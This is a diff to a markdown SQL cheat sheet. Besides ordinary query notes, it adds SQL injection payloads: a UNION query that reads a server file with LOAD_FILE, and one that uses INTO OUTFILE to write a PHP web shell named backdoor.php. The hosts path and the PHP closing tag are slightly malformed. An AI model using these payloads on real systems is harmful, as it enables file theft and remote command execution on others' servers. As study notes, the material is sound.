@@ -71,6 +71,11 @@ ALTER TABLE student DROP COLUMN gpa;
 database()
 ```
 
+* Get current user using the database
+```sql
+user()
+```
+
 * Combine/group multiple rows into one string, good for sql injection attacks.
 ```sql
 select group_concat(schema_name) from INFORMATION_SCHEMA.schemata
@@ -128,6 +133,16 @@ SELECT name FROM student ORDER BY 1;
 SELECT * FROM student LIMIT 2;
 SELECT * FROM student LIMIT [offset], num_rows; 
 ```
+* Read a file with `LOAD_FILE` SQL command!
+```
+1 UNION ALL SELECT 1,2,LOAD_FILE('C:/Windows/System32/drivers/hosts')
+```
+
+* Write to a file using `INTO OUTFILE` command!
+```
+1 UNION ALL SELECT 1,2, "<?php echo '<pre>'. shell_exec($_GET['cmd']. '</re>');?>" INTO OUTFILE('C:/xampp/htdocs/backdoor.php')
+```
+
 
 ## Querying metadata about the tables
 * Getting all existing tables from `INFORMATION_SCHEMA`
